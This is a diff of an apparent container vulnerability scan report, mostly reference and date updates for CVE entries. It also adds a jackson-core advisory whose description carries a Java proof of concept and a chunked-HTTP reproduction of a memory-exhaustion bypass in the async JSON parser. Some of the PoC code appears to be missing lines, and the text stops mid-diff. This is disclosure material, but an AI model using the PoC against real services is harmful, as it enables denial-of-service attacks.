-│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:19061 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20597 
 │                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-4437 
 │                       │      │                  ├ [2] : https://bugzilla.redhat.com/2449777 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2449783 
-│                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
-│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
-│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
-│                       │      │                  ├ [7] : https://cert-portal.siemens.com/productcert/html/ssa-
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2453117 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
+│                       │      │                  ├ [8] : https://cert-portal.siemens.com/productcert/html/ssa-
 │                       │      │                  │       082556.html 
-│                       │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4046 
 │                       │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4437 
+│                       │      │                  │       26-4046 
 │                       │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4437 
+│                       │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       26-4438 
-│                       │      │                  ├ [11]: https://errata.almalinux.org/10/ALSA-2026-19061.html 
-│                       │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:20597 
-│                       │      │                  ├ [13]: https://linux.oracle.com/cve/CVE-2026-4437.html 
-│                       │      │                  ├ [14]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
-│                       │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-4437 
-│                       │      │                  ├ [16]: https://sourceware.org/bugzilla/show_bug.cgi?id=34014 
-│                       │      │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-4437 
-│                       │      │                  ╰ [18]: https://www.openwall.com/lists/oss-security/2026/03/2
+│                       │      │                  ├ [12]: https://errata.almalinux.org/9/ALSA-2026-20597.html 
+│                       │      │                  ├ [13]: https://errata.rockylinux.org/RLSA-2026:20597 
+│                       │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-4437.html 
+│                       │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
+│                       │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-4437 
+│                       │      │                  ├ [17]: https://sourceware.org/bugzilla/show_bug.cgi?id=34014 
+│                       │      │                  ├ [18]: https://www.cve.org/CVERecord?id=CVE-2026-4437 
+│                       │      │                  ╰ [19]: https://www.openwall.com/lists/oss-security/2026/03/2
 │                       │      │                          3/2 
 │                       │      ├ PublishedDate   : 2026-03-20T20:16:49.477Z 
 │                       │      ╰ LastModifiedDate: 2026-07-14T13:18:57.923Z 
@@ -1277,29 +1288,30 @@
 │                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L
 │                       │      │                           │           /A:N 
 │                       │      │                           ╰ V3Score : 4 
-│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:19061 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:20597 
 │                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-4438 
 │                       │      │                  ├ [2] : https://bugzilla.redhat.com/2449777 
 │                       │      │                  ├ [3] : https://bugzilla.redhat.com/2449783 
-│                       │      │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
-│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
-│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
-│                       │      │                  ├ [7] : https://cert-portal.siemens.com/productcert/html/ssa-
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2453117 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2449777 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2449783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2453117 
+│                       │      │                  ├ [8] : https://cert-portal.siemens.com/productcert/html/ssa-
 │                       │      │                  │       082556.html 
-│                       │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4046 
 │                       │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
-│                       │      │                  │       26-4437 
+│                       │      │                  │       26-4046 
 │                       │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-4437 
+│                       │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
 │                       │      │                  │       26-4438 
-│                       │      │                  ├ [11]: https://errata.almalinux.org/10/ALSA-2026-19061.html 
-│                       │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:20597 
-│                       │      │                  ├ [13]: https://linux.oracle.com/cve/CVE-2026-4438.html 
-│                       │      │                  ├ [14]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
-│                       │      │                  ├ [15]: https://nvd.nist.gov/vuln/detail/CVE-2026-4438 
-│                       │      │                  ├ [16]: https://sourceware.org/bugzilla/show_bug.cgi?id=34015 
-│                       │      │                  ├ [17]: https://www.cve.org/CVERecord?id=CVE-2026-4438 
-│                       │      │                  ╰ [18]: https://www.openwall.com/lists/oss-security/2026/03/2
+│                       │      │                  ├ [12]: https://errata.almalinux.org/9/ALSA-2026-20597.html 
+│                       │      │                  ├ [13]: https://errata.rockylinux.org/RLSA-2026:20597 
+│                       │      │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-4438.html 
+│                       │      │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-500006.html 
+│                       │      │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-4438 
+│                       │      │                  ├ [17]: https://sourceware.org/bugzilla/show_bug.cgi?id=34015 
+│                       │      │                  ├ [18]: https://www.cve.org/CVERecord?id=CVE-2026-4438 
+│                       │      │                  ╰ [19]: https://www.openwall.com/lists/oss-security/2026/03/2
 │                       │      │                          3/2 
 │                       │      ├ PublishedDate   : 2026-03-20T20:16:49.623Z 
 │                       │      ╰ LastModifiedDate: 2026-07-14T13:18:58.247Z 
@@ -1875,7 +1887,7 @@
 │                       │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                       │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                       │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                       │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                       │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                       ├ [33] ╭ VulnerabilityID : CVE-2026-13757 
 │                       │      ├ PkgID           : libp11-kit0@0.26.2-2 
 │                       │      ├ PkgName         : libp11-kit0 
@@ -2047,7 +2059,7 @@
 │                       │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                       │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                       │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                       │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                       │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                       ├ [36] ╭ VulnerabilityID : CVE-2026-50812 
 │                       │      ├ PkgID           : libsqlite3-0@3.46.1-9ubuntu0.1 
 │                       │      ├ PkgName         : libsqlite3-0 
@@ -2336,7 +2348,7 @@
 │                       │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                       │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                       │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                       │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                       │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                       ├ [42] ╭ VulnerabilityID : CVE-2026-27456 
 │                       │      ├ PkgID           : login@1:4.16.0-2+really2.41.3-3ubuntu2 
 │                       │      ├ PkgName         : login 
@@ -2460,7 +2472,7 @@
 │                       │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                       │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                       │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                       │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                       │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                       ├ [44] ╭ VulnerabilityID : CVE-2024-56433 
 │                       │      ├ PkgID           : login.defs@1:4.17.4-2ubuntu3 
 │                       │      ├ PkgName         : login.defs 
@@ -2646,7 +2658,7 @@
 │                       │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                       │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                       │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                       │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                       │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                       ├ [47] ╭ VulnerabilityID : CVE-2024-56433 
 │                       │      ├ PkgID           : passwd@1:4.17.4-2ubuntu3 
 │                       │      ├ PkgName         : passwd 
@@ -3710,7 +3722,7 @@
 │                       │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                       │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                       │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                       │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                       │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                       ╰ [70] ╭ VulnerabilityID : CVE-2026-27171 
 │                              ├ PkgID           : zlib1g@1:1.3.dfsg+really1.3.1-1ubuntu3 
 │                              ├ PkgName         : zlib1g 
@@ -3774,69 +3786,501 @@
 │     ├ Class          : lang-pkgs 
 │     ├ Type           : jar 
 │     ├ Packages        
-│     ╰ Vulnerabilities ─ [0] ╭ VulnerabilityID : CVE-2026-54515 
-│                             ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
+│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GHSA-r7wm-3cxj-wff9 
+│                       │     ├ PkgName         : com.fasterxml.jackson.core:jackson-core 
+│                       │     ├ PkgPath         : openaf/openaf.jar 
+│                       │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.22.0 
+│                       │     │                  ╰ UID : 348817934bcfb1b0 
+│                       │     ├ InstalledVersion: 2.22.0 
+│                       │     ├ FixedVersion    : 2.18.8, 2.21.4, 2.22.1 
+│                       │     ├ Status          : fixed 
+│                       │     ├ Layer            ╭ Digest: sha256:357710754a797a0b8d7465470fd490cec4d7a79976f5b
+│                       │     │                  │         16137b13867ed9515ce 
+│                       │     │                  ╰ DiffID: sha256:f7bda0de7895baf23a3ecc70b50bb8bc7be3642a95a7a
+│                       │     │                            246a8f094628c9083e0 
+│                       │     ├ SeveritySource  : ghsa 
+│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-r7wm-3cxj-wff9 
+│                       │     ├ DataSource       ╭ ID  : ghsa 
+│                       │     │                  ├ Name: GitHub Security Advisory Maven 
+│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+│                       │     │                          osystem%3Amaven 
+│                       │     ├ Fingerprint     : sha256:e3e1d9b9fdc22c82d4248319de354d968e6d0723302ca93e29ee9d
+│                       │     │                   2a8e032a01 
+│                       │     ├ Title           : jackson-core: Async parser maxNumberLength bypass via chunked
+│                       │     │                    digit accumulation (incomplete fix for
+│                       │     │                   GHSA-72hv-8253-57qq) 
+│                       │     ├ Description     : ## Summary
+│                       │     │                   
+│                       │     │                   The fix released in jackson-core `2.18.6` and `2.21.1` for
+│                       │     │                   [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-co
+│                       │     │                   re/security/advisories/GHSA-72hv-8253-57qq) (Number Length
+│                       │     │                   Constraint Bypass in Async Parser, published 2026-02-28) is
+│                       │     │                   incomplete. The fix commit `b0c428e6` (#1555) wired
+│                       │     │                   `validateIntegerLength` into a new `_setIntLength` helper and
+│                       │     │                    called it at every place where the integer portion of a
+│                       │     │                   number is *decided* (terminator byte arrived, `.` / `e/E`
+│                       │     │                   seen, end-of-feed inside a fully-buffered value). It did not
+│                       │     │                   call it on the much more attacker-relevant path: "ran out of
+│                       │     │                   input while still inside `MINOR_NUMBER_INTEGER_DIGITS`,
+│                       │     │                   return `NOT_AVAILABLE` to caller".
+│                       │     │                   As a result, an attacker who streams JSON to a non-blocking
+│                       │     │                   parser in many small chunks, without ever sending a
+│                       │     │                   terminator byte, can keep the parser inside
+│                       │     │                   `MINOR_NUMBER_INTEGER_DIGITS` indefinitely.
+│                       │     │                   `_textBuffer.expandCurrentSegment()` grows on every chunk,
+│                       │     │                   and `validateIntegerLength` is never invoked. The accumulator
+│                       │     │                    is only gated by `maxStringLength` (20 MiB default) — a
+│                       │     │                   **~20,000x amplification** of the documented
+│                       │     │                   `maxNumberLength` (1000 default).
+│                       │     │                   This is the same vulnerability class, same advisory wording
+│                       │     │                   ("Memory Exhaustion: Unbounded allocation in TextBuffer from
+│                       │     │                   excessively long numbers"), same parser class — just the
+│                       │     │                   streaming path the original fix didn't cover. The fix to the
+│                       │     │                   *fraction* path is correct (see `_finishFloatFraction` at
+│                       │     │                   line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in
+│                       │     │                   2.18.6, where `_setFractLength(fractLen)` IS called before
+│                       │     │                   the `NOT_AVAILABLE` return); the equivalent call is missing
+│                       │     │                   from every integer-digit path.
+│                       │     │                   ## Affected versions
+│                       │     │                   Verified on the patched releases:
+│                       │     │                   - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
+│                       │     │                   - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
+│                       │     │                   Structurally identical code in `tools.jackson.core` 3.0.x /
+│                       │     │                   3.1.x — same `NonBlockingUtf8JsonParserBase` class, same
+│                       │     │                   `_setIntLength` rollout, same NOT_AVAILABLE returns without
+│                       │     │                   validation. Not retested but presumed vulnerable.
+│                       │     │                   ## Affected code
+│                       │     │                   [`src/main/java/com/fasterxml/jackson/core/json/async/NonBloc
+│                       │     │                   kingUtf8JsonParserBase.java`](https://github.com/FasterXML/ja
+│                       │     │                   ckson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/
+│                       │     │                   core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6
+│                       │     │                    / 2.21.1.
+│                       │     │                   ### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:
+│                       │     │                   ```java
+│                       │     │                   if (outPtr >= outBuf.length) {
+│                       │     │                       // NOTE: must expand to ensure contents all in a single
+│                       │     │                   buffer (to keep
+│                       │     │                       // other parts of parsing simpler)
+│                       │     │                       outBuf = _textBuffer.expandCurrentSegment();
+│                       │     │                   }
+│                       │     │                   outBuf[outPtr++] = (char) ch;
+│                       │     │                   if (++_inputPtr >= _inputEnd) {
+│                       │     │                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+│                       │     │                       _textBuffer.setCurrentLength(outPtr);
+│                       │     │                       return _updateTokenToNA();          // <-- no
+│                       │     │                   validateIntegerLength(outPtr)
+│                       │     │                   ```
+│                       │     │                   ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
+│                       │     │                   protected JsonToken _finishNumberIntegralPart(char[] outBuf,
+│                       │     │                   int outPtr) throws IOException {
+│                       │     │                       int negMod = _numberNegative ? -1 : 0;
+│                       │     │                       while (true) {
+│                       │     │                           if (_inputPtr >= _inputEnd) {
+│                       │     │                               _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+│                       │     │                               _textBuffer.setCurrentLength(outPtr);
+│                       │     │                               return _updateTokenToNA();    // <-- no
+│                       │     │                   validateIntegerLength(outPtr + negMod)
+│                       │     │                           }
+│                       │     │                           int ch = getByteFromBuffer(_inputPtr) & 0xFF;
+│                       │     │                           if (ch < INT_0) {
+│                       │     │                               if (ch == INT_PERIOD) {
+│                       │     │                                   _setIntLength(outPtr+negMod);   // <--
+│                       │     │                   validated here
+│                       │     │                                   ++_inputPtr;
+│                       │     │                                   return _startFloat(outBuf, outPtr, ch);
+│                       │     │                               }
+│                       │     │                               break;
+│                       │     │                           if (ch > INT_9) {
+│                       │     │                               if ((ch | 0x20) == INT_e) {
+│                       │     │                           ++_inputPtr;
+│                       │     │                           if (outPtr >= outBuf.length) {
+│                       │     │                               outBuf = _textBuffer.expandCurrentSegment();
+│                       │     │                           outBuf[outPtr++] = (char) ch;
+│                       │     │                       }
+│                       │     │                       _setIntLength(outPtr+negMod);            // <-- validated
+│                       │     │                    here
+│                       │     │                       return _valueComplete(JsonToken.VALUE_NUMBER_INT);
+│                       │     │                   The pattern recurs at lines 1297, 1329, 1343, 1365, 1395,
+│                       │     │                   1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of
+│                       │     │                   input mid-integer" exit returns to the caller without
+│                       │     │                   validating the accumulator length.
+│                       │     │                   ### Compare with the fraction path that is correct
+│                       │     │                   `_finishFloatFraction` lines 1827-1838:
+│                       │     │                   while (loop) {
+│                       │     │                       if (ch >= INT_0 && ch <= INT_9) {
+│                       │     │                           ++fractLen;
+│                       │     │                               _setFractLength(fractLen);          // <--
+│                       │     │                   VALIDATED
+│                       │     │                               return JsonToken.NOT_AVAILABLE;
+│                       │     │                           ch = getNextSignedByteFromBuffer();
+│                       │     │                       ...
+│                       │     │                   ## Impact
+│                       │     │                   Reactive frameworks (Spring WebFlux / Reactor, Quarkus,
+│                       │     │                   Helidon, Vert.x JSON, anything wrapping
+│                       │     │                   `JsonFactory.createNonBlockingByteArrayParser()` or
+│                       │     │                   `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC
+│                       │     │                    bytes to the async parser as they arrive. Operators who set
+│                       │     │                   `StreamReadConstraints.builder().maxNumberLength(N)` on the
+│                       │     │                   assumption that this caps memory per number value are not
+│                       │     │                   getting that guarantee in chunked-feed scenarios. The parser
+│                       │     │                   silently accumulates digits up to `maxStringLength` (20 MiB
+│                       │     │                   default) per concurrent connection. Multiply by
+│                       │     │                   attacker-controlled concurrency to OOM the JVM.
+│                       │     │                   The synchronous parsers (`UTF8StreamJsonParser`,
+│                       │     │                   `ReaderBasedJsonParser`) and the async parser on *complete*
+│                       │     │                   input are not affected — those paths go through
+│                       │     │                   `_setIntLength` or `ParserBase._reportTooLongIntegral`
+│                       │     │                   correctly.
+│                       │     │                   CWE-770 (Allocation of Resources Without Limits or
+│                       │     │                   Throttling), CVSS roughly the same as the parent advisory
+│                       │     │                   (Network / Low complexity / High availability impact). The
+│                       │     │                   parent advisory was scored CVSS 8.7 High.
+│                       │     │                   ## Proof of concept
+│                       │     │                   Standalone PoC, no Maven required:
+│                       │     │                   mkdir poc && cd poc
+│                       │     │                   curl -sLo jackson-core-2.18.6.jar
+│                       │     │                   https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jac
+│                       │     │                   kson-core/2.18.6/jackson-core-2.18.6.jar
+│                       │     │                   cat > PoC.java <<'EOF'
+│                       │     │                   import com.fasterxml.jackson.core.*;
+│                       │     │                   import com.fasterxml.jackson.core.async.ByteArrayFeeder;
+│                       │     │                   public class PoC {
+│                       │     │                       public static void main(String[] args) throws Exception
+│                       │     │                   {
+│                       │     │                           StreamReadConstraints strict =
+│                       │     │                   StreamReadConstraints.builder()
+│                       │     │                                   .maxNumberLength(1000)
+│                       │     │                                   .build();
+│                       │     │                           JsonFactory f = new JsonFactoryBuilder()
+│                       │     │                                   .streamReadConstraints(strict)
+│                       │     │                           // Sanity: synchronous parser rejects 5000-digit
+│                       │     │                   int.
+│                       │     │                           try (JsonParser p = f.createParser("{\"v\":" +
+│                       │     │                   "1".repeat(5000) + "}")) {
+│                       │     │                               while (p.nextToken() != null) { /* drive */ }
+│                       │     │                               System.out.println("[-] BUG ABSENT: sync parser
+│                       │     │                   accepted");
+│                       │     │                               return;
+│                       │     │                           } catch (Exception e) {
+│                       │     │                               System.out.println("[+] sync parser rejected
+│                       │     │                   5000-digit int: " + e.getClass().getSimpleName());
+│                       │     │                           // Bug: async parser, chunked, no terminator.
+│                       │     │                           JsonParser ap =
+│                       │     │                   f.createNonBlockingByteArrayParser();
+│                       │     │                           ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
+│                       │     │                           byte[] preamble = "{\"v\":".getBytes("UTF-8");
+│                       │     │                           feeder.feedInput(preamble, 0, preamble.length);
+│                       │     │                           while (ap.nextToken() != JsonToken.NOT_AVAILABLE) {
+│                       │     │                   /* drain */ }
+│                       │     │                           byte[] digits = new byte[16 * 1024];
+│                       │     │                           for (int i = 0; i < digits.length; i++) digits[i] =
+│                       │     │                   (byte) ('1' + (i % 9));
+│                       │     │                           for (int c = 0; c < 600; c++) {
+│                       │     │                               feeder.feedInput(digits, 0, digits.length);
+│                       │     │                               JsonToken t = ap.nextToken();
+│                       │     │                               if (t != JsonToken.NOT_AVAILABLE) {
+│                       │     │                                   System.out.println("[-] unexpected token: " +
+│                       │     │                    t);
+│                       │     │                                   return;
+│                       │     │                           System.out.println("[+] BUG PRESENT: async parser
+│                       │     │                   accepted ~9.83 MB of digits with maxNumberLength=1000");
+│                       │     │                           // Closing the number now finally triggers the
+│                       │     │                   validator.
+│                       │     │                           feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
+│                       │     │                           feeder.endOfInput();
+│                       │     │                           try {
+│                       │     │                               while (ap.nextToken() != null) { /* drive */ }
+│                       │     │                               System.out.println("[*] late rejection on close:
+│                       │     │                   " + e.getMessage().split("\n")[0]);
+│                       │     │                           ap.close();
+│                       │     │                   EOF
+│                       │     │                   javac -cp jackson-core-2.18.6.jar PoC.java
+│                       │     │                   java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
+│                       │     │                   Observed output against `jackson-core-2.18.6`:
+│                       │     │                   [+] sync parser rejected 5000-digit int:
+│                       │     │                   StreamConstraintsException
+│                       │     │                   [+] BUG PRESENT: async parser accepted ~9.83 MB of digits
+│                       │     │                   with maxNumberLength=1000
+│                       │     │                   [*] late rejection on close: Number value length (9830400)
+│                       │     │                   exceeds the maximum allowed (1000, from
+│                       │     │                   `StreamReadConstraints.getMaxNumberLength()`)
+│                       │     │                   Observed output against `jackson-core-2.21.1`: identical.
+│                       │     │                   The 9.83 MB figure is purely a function of the loop bound
+│                       │     │                   (600 chunks * 16 KiB). The actual ceiling is `maxStringLength
+│                       │     │                    = 20 MiB`. With the strict policy declared as
+│                       │     │                   `maxNumberLength = 1000`, the parser permits **9830x** more
+│                       │     │                   allocation than the policy allows. With `maxStringLength`
+│                       │     │                   left at the default 20 MiB, an attacker can drive a single
+│                       │     │                   connection to 40 MiB of `char[]` heap (chars are 2 bytes
+│                       │     │                   each) before the validator finally fires on
+│                       │     │                   terminator/`endOfInput()`. Multiply by concurrent
+│                       │     │                   connections.
+│                       │     │                   ## End-to-end reproduction through real HTTP
+│                       │     │                   Supplements the standalone PoC with a running Spring Boot
+│                       │     │                   WebFlux server,
+│                       │     │                   driving the same bug through the actual reactor-netty +
+│                       │     │                   Jackson2JsonDecoder
+│                       │     │                   streaming-decode path that production reactive endpoints
+│                       │     │                   use.
+│                       │     │                   Setup:
+│                       │     │                   - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14,
+│                       │     │                   reactor-netty 1.1.23)
+│                       │     │                   - jackson-databind 2.17.2, jackson-core overridden:
+│                       │     │                     - VULN run:
+│                       │     │                   `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest
+│                       │     │                   published)
+│                       │     │                     - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch
+│                       │     │                   - JVM: OpenJDK 17.0.18
+│                       │     │                   - Server `JsonFactory` configured with
+│                       │     │                   `StreamReadConstraints.builder().maxNumberLength(1000).build(
+│                       │     │                   )`
+│                       │     │                   Endpoint under test exposes the `Flux<DataBuffer>` request
+│                       │     │                   body directly to
+│                       │     │                   `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so
+│                       │     │                   the parser sees one
+│                       │     │                   HTTP chunk per `feedInput` (the same pattern used for any
+│                       │     │                   `@RequestBody Flux<...>` / streaming JSON decoder in
+│                       │     │                   WebFlux). A raw-socket
+│                       │     │                   HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of
+│                       │     │                   200 digit bytes
+│                       │     │                   each (50,000 digits total) at 20ms intervals, then writes the
+│                       │     │                    closing `}`.
+│                       │     │                   VULN — jackson-core 2.18.7:
+│                       │     │                   [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks;
+│                       │     │                   server still accepting
+│                       │     │                   [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
+│                       │     │                   HTTP/1.1 200 OK
+│                       │     │                   ERR after 6548ms
+│                       │     │                   cause=com.fasterxml.jackson.core.exc.StreamConstraintsExcepti
+│                       │     │                   on:
+│                       │     │                          Number value length (50000) exceeds the maximum
+│                       │     │                   allowed (1000, ...)
+│                       │     │                   Server-side controller trace (250 DataBuffer arrivals
+│                       │     │                   elided):
+│                       │     │                   [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
+│                       │     │                   [ctrl] DataBuffer arrived size=200 ms=42
+│                       │     │                   ...
+│                       │     │                   [ctrl] DataBuffer arrived size=199 ms=5993
+│                       │     │                   [ctrl] DataBuffer arrived size=1   ms=6518     <- closing
+│                       │     │                   '}'
+│                       │     │                   [ctrl] ERR after 6548ms ... Number value length (50000)
+│                       │     │                   exceeds ...
+│                       │     │                   Server held all 50,000 digit characters in `_textBuffer` for
+│                       │     │                   6.5 seconds with
+│                       │     │                   `maxNumberLength=1000` declared. The validator never fires
+│                       │     │                   during streaming;
+│                       │     │                   it only fires at value-completion when the closing `}`
+│                       │     │                   arrives.
+│                       │     │                   PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
+│                       │     │                   [PATCHED-SMALLCHUNK] connection broke after 2801 digits at
+│                       │     │                   chunk 14: [Errno 32] Broken pipe
+│                       │     │                   [PATCHED-SMALLCHUNK] DONE: digits_sent=2801
+│                       │     │                   status=connection-broke-mid-stream
+│                       │     │                   Server-side controller trace:
+│                       │     │                   [ctrl] DataBuffer arrived size=6   ms=129
+│                       │     │                   [ctrl] DataBuffer arrived size=200 ms=142
+│                       │     │                   [ctrl] DataBuffer arrived size=200 ms=145
+│                       │     │                   [ctrl] DataBuffer arrived size=200 ms=146
+│                       │     │                   [ctrl] DataBuffer arrived size=200 ms=147
+│                       │     │                   [ctrl] ERR after 155ms ... Number value length (1001) exceeds
+│                       │     │                    the maximum allowed (1000, ...)
+│                       │     │                   Patched server raises `StreamConstraintsException` at 155ms
+│                       │     │                   after only 5
+│                       │     │                   DataBuffers, exactly when the accumulated digit count
+│                       │     │                   crosses
+│                       │     │                   `maxNumberLength=1000`. The connection is reset mid-stream
+│                       │     │                   rather than the
+│                       │     │                   parser silently consuming the rest of the attacker's
+│                       │     │                   payload.
+│                       │     │                   Side-by-side:
+│                       │     │                   | Build | Chunks accepted before exception | Digits buffered
+│                       │     │                   | Time to detection |
+│                       │     │                   |---|---|---|---|
+│                       │     │                   | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the
+│                       │     │                   configured limit) | 6,548ms — only at terminator |
+│                       │     │                   | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment
+│                       │     │                   threshold crossed |
+│                       │     │                   Note on the default `@RequestBody Mono<JsonNode>` path: that
+│                       │     │                   path cannot
+│                       │     │                   distinguish the two builds because Spring's `decodeToMono`
+│                       │     │                   joins all
+│                       │     │                   DataBuffers into one before parsing. The exploitable shape is
+│                       │     │                    the
+│                       │     │                   streaming-decode path (`Flux<JsonNode>` / `@RequestBody
+│                       │     │                   Flux<...>` /
+│                       │     │                   WebSocket / SSE / any direct
+│                       │     │                   `decoder.decode(Flux<DataBuffer>, ...)` call),
+│                       │     │                   which is also what `Jackson2Tokenizer` uses for any streaming
+│                       │     │                    JSON
+│                       │     │                   deserialization in WebFlux and Quarkus reactive REST.
+│                       │     │                   ## Suggested fix
+│                       │     │                   Mirror the pattern already used in `_finishFloatFraction`. At
+│                       │     │                    every site that returns `_updateTokenToNA()` (or
+│                       │     │                   `JsonToken.NOT_AVAILABLE`) with `_minorState =
+│                       │     │                   MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr +
+│                       │     │                   negMod)` first. Concretely, the diff to
+│                       │     │                   `NonBlockingUtf8JsonParserBase.java` would be:
+│                       │     │                   ```diff
+│                       │     │                        protected JsonToken _finishNumberIntegralPart(char[]
+│                       │     │                   outBuf, int outPtr) throws IOException {
+│                       │     │                            int negMod = _numberNegative ? -1 : 0;
+│                       │     │                            while (true) {
